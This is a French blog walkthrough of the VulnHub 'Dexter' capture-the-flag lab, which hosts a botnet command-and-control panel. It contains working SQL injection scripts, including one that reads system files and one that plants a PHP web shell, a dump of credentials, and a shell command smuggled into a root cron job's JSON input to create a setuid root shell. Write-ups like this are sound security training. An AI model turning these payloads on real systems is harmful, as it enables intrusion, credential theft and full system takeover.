# Solution du CTF Dexter

Tam tadam tadam...
------------------

[Le challenge Dexter de VulnHub](http://vulnhub.com/entry/bot-challenges-dexter,59/) est le troisième d'une série dédié à l'intrusion dans un serveur où se trouve le C&C d'un botnet.  

Vous trouverez sur mon site les solutions des deux précédents challenges [RA1NXing Bots](http://devloop.users.sourceforge.net/index.php?article87/solution-du-ctf-ra1nxing-bots) et [Flipping Bitbot](http://devloop.users.sourceforge.net/index.php?article89/solution-du-ctf-flipping-bitbot).  

Comme pour les précédents le CTF semble se baser sur un botnet existant, en occurrence le malware *Dexter*.  

Pour pouvoir réellement commencer ce CTF il faut obtenir quelques informations sur le bot, en particulier la façon dont il communique avec le C&C sans quoi il y a peut de chances de trouver une porte d'entrée.  

J'ai trouvé deux articles concernant ce bot, [le premier de SpiderLabs](http://blog.spiderlabs.com/2012/12/the-dexter-malware-getting-your-hands-dirty.html) décrit le chiffrement qui est utilisé par le bot.  

[Le second article par Cylance](http://blog.cylance.com/a-study-in-bots-dexter-pos-botnet-malware) donne plus d'informations et certains le considéreront peut être comme un spoiler.  

J'ai décidé de m'attaquer au challenge en me limitant à la connaissance de l’algorithme de chiffrement.  

Utiliser un exploit existant pour *Dexter* aurait diminué l’intérêt du challenge (un module *Metasploit* semble exister pour le C&C).  

Un air de famille
-----------------

Quand on lance le scan de ports on découvre des services qui ne sont pas sans rappeler les précédents challenges.  

A se demander si le RPC n'est pas actif par défaut sous Debian...  

```plain
Nmap scan report for 192.168.1.54
Host is up (0.00023s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4 (protocol 2.0)
| ssh-hostkey: 
|   1024 2b:60:6f:53:b8:c9:c8:f4:3b:0e:9b:9e:46:97:b7:55 (DSA)
|   2048 b5:9f:66:ab:f8:5d:a9:3e:51:8a:97:c3:85:10:e3:62 (RSA)
|_  256 e7:bc:52:4f:29:0d:db:21:7e:72:76:2b:dd:ec:12:8e (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          36505/tcp  status
|_  100024  1          50061/udp  status
36505/tcp open  status  1 (RPC #100024)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          36505/tcp  status
|_  100024  1          50061/udp  status
```

Arrivé sur le site web on trouve deux liens. Le premier vers */Panel/* qui est de toute évidence le dossier où a été placé les scripts du C&C.  

Le second lien est [une analyse automatique du bot](https://malwr.com/analysis/YTI0ZWI4ZjExNmY0NDRjMTgzOWM3NTQxZTViNjZmNjA/) (un exécutable win32) réalisé par le site *malwr.com*.  

Parmi les chaines qui pourraient être d'une quelquonque utilité on relève :  

```plain
62.149.24.147
dexter/gateway.php
response=
&view=
&spec=
&query=
download-
update-
checkin:
scanin:
uninstall
```

Network forensics
-----------------

Mais le plus intéressant est la trace réseau récupérée par l'analyse, en particulier la requête HTTP qui a été transmise vers *gateway.php*.  

Ainsi si l'on se base sur l'article de *SpiderLabs*, le paramètre val envoyé par POST contient la clé de chiffrement encodée en base64.  

Son décodage (par Python ou tout autre site en ligne et utilitaire) retourne la clé *"gisha"* (le bot génère une clé aléatoire à chaque requête).  

![Harry's Code](https://raw.githubusercontent.com/devl00p/blog/master/images/dexter1.jpg)

J'ai écrit le programme suivant qui permet de chiffrer / déchiffrer des données transmises par *Dexter* :  

```python
#!/usr/bin/python
import sys
import base64

key = None

def encrypt(s):
    e = ""
    for c in s:
        x = ord(c)
        for k in key:
            x = x ^ ord(k)
        e = e + chr(x)
    return base64.b64encode(e)

def decrypt(s):
    s2 = base64.b64decode(s)
    e = ""
    for c in s2:
        x = ord(c)
        for k in key:
            x = x ^ ord(k)
        e = e + chr(x)
    return e

if len(sys.argv) < 4 or sys.argv[2] not in ["e","d"]:
    print "Usage: {0} <key> [e|d] <data>".format(sys.argv[0])
    sys.exit()

key = sys.argv[1]
if sys.argv[2] == "e":
    print encrypt(sys.argv[3])
else:
    print decrypt(sys.argv[3])
```

Ainsi si j'appelle ce script en passant comme paramètre :  

* gisha (la clé)
* d (pour déchiffrer)
* le contenu de la variable view dans la requête HTTP

J'obtiens ce résultat :  

```plain
[System Process]
System
smss.exe
csrss.exe
winlogon.exe
services.exe
lsass.exe
svchost.exe
svchost.exe
svchost.exe
svchost.exe
svchost.exe
explorer.exe
spoolsv.exe
jqs.exe
GrooveMonitor.exe
ctfmon.exe
pythonw.exe
alg.exe
svchost.exe
pythonw.exe
iexplore.exe
iexplore.exe
```

On a donc quelques méthodes qui nous serviront par la suite.  

Un scan du dossier */Panel/* avec *dirb* révèle d'autres pages web :  

```plain
$ ./dirb http://192.168.1.54/Panel/ wordlists/big.txt -X .php
---- Scanning URL: http://192.168.1.54/Panel/ ----
+ http://192.168.1.54/Panel/config.php (CODE:200|SIZE:0)                                                                                                                                                      
+ http://192.168.1.54/Panel/gateway.php (CODE:200|SIZE:0)                                                                                                                                                     
+ http://192.168.1.54/Panel/index.php (CODE:200|SIZE:234)                                                                                                                                                     
+ http://192.168.1.54/Panel/info.php (CODE:200|SIZE:2)                                                                                                                                                        
+ http://192.168.1.54/Panel/load.php (CODE:200|SIZE:0)                                                                                                                                                        
+ http://192.168.1.54/Panel/main.php (CODE:200|SIZE:4)                                                                                                                                                        
+ http://192.168.1.54/Panel/master.php (CODE:200|SIZE:385)                                                                                                                                                    
+ http://192.168.1.54/Panel/pagination.php (CODE:200|SIZE:90)                                                                                                                                                 
+ http://192.168.1.54/Panel/upload.php (CODE:200|SIZE:514)                                                                                                                                                    
+ http://192.168.1.54/Panel/viewer.php (CODE:200|SIZE:47)
```

Ces pages ne révèlent rien de bien intéressant. Le script d'upload semble ouvert mais n'indique pas si l'upload a bien fonctionné et ne donne pas le chemin vers le fichier uploadé.  

Premier coup de scalpel
-----------------------

Je reviens donc vers *gateway.php* : on sait maintenant comment chiffrer les paramètres mais on ne sait pas quels paramètres sont vulnérables.  

Pour cela j'ai écris un script qui teste plusieurs payloads d'injection MySQL time-based pour chaque paramètre (la fonction encrypt n'est pas affichée pour gagner de la place).  

La méthode time-based a été choisie car *gateway.ph*p ne semble retourner aucun contenu à priori :(  

```python
args = ['page', 'unm', 'cnm', 'query', 'spec', 'opt', 'view', 'var']
key = "test"

payloads = [' OR sleep(5)#', '" OR sleep(5)#', '\' OR sleep(5)#']
url = "http://192.168.1.54/Panel/gateway.php"
hdrs = {"Content-Type": "application/x-www-form-urlencoded"}

sess = requests.session()

for a in args:
    for p in payloads:
        d = {
                "val": base64.b64encode(key),
                a: encrypt(p)
            }
        print "param = {0}, payload = {1}".format(a, p)
        try:
            r = sess.post(url, data=d, headers=hdrs, timeout=3)
            print r.content
        except:
            print "timeout !"
            break
        print "=================================="
```

Dans l'output généré on voit :  

```plain
==================================
param = page, payload = ' OR sleep(5)#
timeout !
```

![Wonderfuck!](https://raw.githubusercontent.com/devl00p/blog/master/images/dexter2.gif)

Le paramètre page est donc vulnérable et il faut fermer une quote pour injecter du SQL.  

Maintenant voyons voir comment on peut extraire des données de la base.  

La méthode la plus simple est d'utiliser un UNION mais on ne sait pas combien de colonnes seront nécessaires pour que l'opération réussisse.  

Là encore j'ai écris un script qui teste jusqu'à 10 colonnes en espérant que dans les différentes réponses HTTP on en trouve une qui diffère des autres.  

J'ai eu la bonne idée d'afficher les headers HTTP dans l'output.  

```python
payloads = [
    "' UNION SELECT NULL#",
    "' UNION SELECT NULL,NULL#",
    "' UNION SELECT NULL,NULL,NULL#",
    "' UNION SELECT NULL,NULL,NULL,NULL#",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL#",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL#",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#"
    ]

url = "http://192.168.1.54/Panel/gateway.php"
hdrs = {"Content-Type": "application/x-www-form-urlencoded"}

sess = requests.session()

for p in payloads:
    d = {
            "val": base64.b64encode(key),
            arg: encrypt(p)
        }
    print "payload = {0}".format(p)
    try:
        r = sess.post(url, data=d, headers=hdrs, timeout=3)
        print r.headers
        print r.content
    except:
        print "error !"
        break
    print "=================================="
```

Pour une UNION avec 3 colonnes on s'apperçoit qu'une valeur de cookie différente est retournée :  

```plain
payload = ' UNION SELECT NULL#
CaseInsensitiveDict({'content-length': '20', 'x-powered-by': 'PHP/5.4.4-14+deb7u8', 'set-cookie': 'response=MjU%3D', --- snip ---

==================================
payload = ' UNION SELECT NULL,NULL#
CaseInsensitiveDict({'content-length': '20', 'x-powered-by': 'PHP/5.4.4-14+deb7u8', 'set-cookie': 'response=MjU%3D', --- snip ---

==================================
payload = ' UNION SELECT NULL,NULL,NULL#
CaseInsensitiveDict({'content-length': '20', 'x-powered-by': 'PHP/5.4.4-14+deb7u8', 'set-cookie': 'response=Mi01', --- snip ---

==================================
payload = ' UNION SELECT NULL,NULL,NULL,NULL#
CaseInsensitiveDict({'content-length': '20', 'x-powered-by': 'PHP/5.4.4-14+deb7u8', 'set-cookie': 'response=MjU%3D', --- snip ---

--- snip ---
```

On reprend le script précédent en modifiiant juste la liste des payloads :  

```python
payloads = [
    "' UNION SELECT 'encodeme',NULL,NULL#",
    "' UNION SELECT NULL,'encodeme',NULL#",
    "' UNION SELECT NULL,NULL',encodeme'#"
    ]
```

Pour le second cas (la chaîne *encodeme* en seconde position) le script me retourne un *Set-Cookie response=MnN4dXlyc3tzLTU%3D* ce qui une fois décodé correspond à :  

```plain
$encodeme;#
```

Un préfixe et un suffixe sont rajoutés mais le principal est que l'on est finalement pas en présence d'une injection en aveugle :)  

I've imagined her naked plenty times, but never like this
---------------------------------------------------------

Ni une ni deux, je code un exploit me permettant de lire un fichier sur le système en injecter un *LOAD\_FILE()* :  

```python
import requests
import base64
import sys
import urllib

arg = 'page'
key = "test"

def encrypt(s):
    e = ""
    for c in s:
        x = ord(c)
        for k in key:
            x = x ^ ord(k)
        e = e + chr(x)
    return base64.b64encode(e)

def decrypt(s):
    s2 = base64.b64decode(s)
    e = ""
    for c in s2:
        x = ord(c)
        for k in key:
            x = x ^ ord(k)
        e = e + chr(x)
    return e

url = "http://192.168.1.54/Panel/gateway.php"
hdrs = {"Content-Type": "application/x-www-form-urlencoded"}

sess = requests.session()
payload = "' UNION SELECT NULL,LOAD_FILE('{0}'),NULL#".format(sys.argv[1])
d = {
        "val": base64.b64encode(key),
        arg: encrypt(payload)
    }
r = sess.post(url, data=d, headers=hdrs, timeout=3)
data = urllib.unquote(r.headers['set-cookie'].split("=", 1)[1])
print decrypt(data)
```

Dans la pratique :  

```plain
$ python exploit.py /etc/passwd
$root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
dexter:x:1000:1000:dexter,,,:/home/dexter:/bin/bash
mysql:x:104:106:MySQL Server,,,:/nonexistent:/bin/false
;#
```

Après avoir retrouvé les fichiers de configuration d'Apache (*/etc/apache2/apache2.conf* et */etc/apache2/sites-enabled/000-default*) je récupère le *config.php* du C&C :  

```php
<?php
    //Connect to shitty DB
        $dbname = "nasproject";
        $user = "root";
        $pw = "password";
    $link = mysql_connect('localhost',$user,$pw);
    $db = mysql_select_db($dbname,$link);
    /////////////////////////////////////////
?>
```

C'est bien mais maintenant il faudrait écrire sur le disque. Pas bien compliqué (*exes* étant le path utilisé par le script d'upload donc certainement écrivable) :  

```python
payload = "' UNION SELECT NULL,'<?php system($_GET[\"cmd\"]); ?>',NULL INTO OUTFILE '/var/www/Panel/exes/bd.php'#"
url = "http://192.168.1.54/Panel/gateway.php"
hdrs = {"Content-Type": "application/x-www-form-urlencoded"}

sess = requests.session()
d = {
        "val": base64.b64encode(key),
        arg: encrypt(payload)
    }
r = sess.post(url, data=d, headers=hdrs, timeout=3)
data = urllib.unquote(r.headers['set-cookie'].split("=", 1)[1])
print decrypt(data)
```

Une fois un shell récupéré je peux me connecter sur le serveur MySQL avec les identifiants vus plus tôt.  

```plain
mysql> show tables;
+----------------------+
| Tables_in_nasproject |
+----------------------+
| bots                 |
| commands             |
| config               |
| logs                 |
| users                |
+----------------------+
5 rows in set (0.00 sec)

mysql> select * from users;
+-------------+-----------------------------------------------------------+
| name        | password                                                  |
+-------------+-----------------------------------------------------------+
| loserbotter | if i had any real talent, i would make money legitimately |
+-------------+-----------------------------------------------------------+
1 row in set (0.00 sec)
```

On a maintenant les identifiants d'accès au C&C... Mais au point où on en est quel intérêt ?  

Au passage j'ai jeté un œil aux hashs dans la table user de MySQL et ils correspondent tous les deux (pour *root* et *dexter*) à "password".  

The coroner can suck my uncircumcised dick if he doesn't rule this a homicide
-----------------------------------------------------------------------------

Dans */var/www* il y a des fichiers il y a des fichiers qui ne semblent attendre que nous :  

```plain
root@dexter:/var/www# ls -l
total 16
-rw-rw-rw- 1 root root  840 Mar 16 18:03 antitamper.list
-rw-r--r-- 1 root root  278 Mar 16 17:04 antitamper.py
-rw-r--r-- 1 root root  201 Mar 16 18:05 index.html
drwxr-xr-x 3 root root 4096 Mar 16 18:10 Panel
-rw-r--r-- 1 root root    0 Mar 16 17:04 tamper.log
```

Le fichier *antitamper.list* est un fichier JSON avec des hashs et des noms de fichiers :  

```python
{
    "/var/www/Panel/info.php": "d8fa4356213b6ce9253f55acdff780ac",
    "/var/www/Panel/upload.php" : "b2640cea86e5171662a082b6a043fcc2",
    "/var/www/Panel/style.css": "92f234834a61b7fde898eea40f857bb3",
    "/var/www/Panel/gateway.php": "7b93115195db0c0b085a1107c4cc1aed",
    "/var/www/Panel/pagination.php": "1a8d91c12263dd5298a70c72976c5e97",
    "/var/www/Panel/viewer.php": "292b3b12c2f90c0e557bf599c2475c15",
    "/var/www/Panel/config.php": "421fc13061ab1f343e6607e4ef4f8f42",
    "/var/www/Panel/main.php": "7812b7c1ed608299c9bece4f46607423",
    "/var/www/Panel/load.php": "0f95762562aa97c62d004949e7337e95",
    "/var/www/Panel/viewer_pagination.php": "60c7444a92daa115abfecc73c46fc2ec",
    "/var/www/Panel/master.php": "2b50c51fce89ddcfb769effdeab7080c",
    "/var/www/Panel/index.php": "af44aa507c02f3c1aede5e251b28dc64"
}
```

Quand au script Python (qui est une sorte de vérificateur d'intégrité des fichiers) :  

```python
import os
import json

def check():
    with open('/var/www/antitamper.list') as f:
        content = json.loads(f.read())
        for f in content:
            s = "echo '%s  %s' | md5sum -c --status >> /var/www/tamper.log" % (content[f], f)
            os.system(s)

check()
```

Le script appelle la commande *echo* via *os.system()*. Il lui passe deux arguments provenant du fichier JSON.  

Or il se trouve que ce dernier est word-writable. Le modifier pour provoquer une injection de commande n'est pas difficile par contre j'ai beau avoir cherché ce qui peut provoquer l'appel de *antitamper.py* je n'ai rien trouvé.  

J'ai finalement tenté ma chance en modifiant la première entrée du dictionnaire de cette façon :  

```plain
"';chown root.root /var/www/Panel/exes/getroot;chmod +s /var/www/Panel/exes/getroot;#'": "d8fa4356213b6ce9253f55acdff780ac",
```

Où getroot est un programme préalablement compilé qui fait un setuid/setgid 0 avant de lancer un shell.  

Un dièse est placé pour marquer un commentaire bash et une quote est là pour que le nombre total de quotes soit paire (sinon bash peut lever une erreur de syntaxe).  

Et miracle :  

```plain
$ cp antitamper.list /tmp/sav_antitamper.list
$ cp /tmp/modified_antitamper.list antitamper.list
$  ls -l Panel/exes/
total 740
-rw-rw-rw- 1 mysql mysql     36 Jun  9 18:12 bd.php
-rwsr-xr-x 1 root  root   10722 Jun 10 01:15 getroot
-rwxrw-rw- 1 mysql mysql 738792 Apr 19 13:44 tshd
$ ./Panel/exes/getroot
root@dexter:/tmp# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
root@dexter:/tmp# head -1 /etc/shadow
root:$6$gN9t1RCt$dYj80MPAWCeWkh9kTpoPHuUU.x5hfaXfrB.UUWkMQDQpjDfAHO4D2RLWvG00wjUGrO8EMdfl/Ys31WePgl8hV1:16145:0:99999:7:::
```

![FUCK YEAH!](https://raw.githubusercontent.com/devl00p/blog/master/images/dexter3.gif)

Quand à l'explication sur le lancement de *antitamper.py* :  

```plain
root@dexter:~# tail -1 /var/spool/cron/crontabs/root 
*/1 * * * * python /var/www/antitamper.py
```

Next step [LoBOTomy](http://vulnhub.com/entry/bot-challenges-lobotomy,89/) ?

*Published June 13 2014 at 22:09*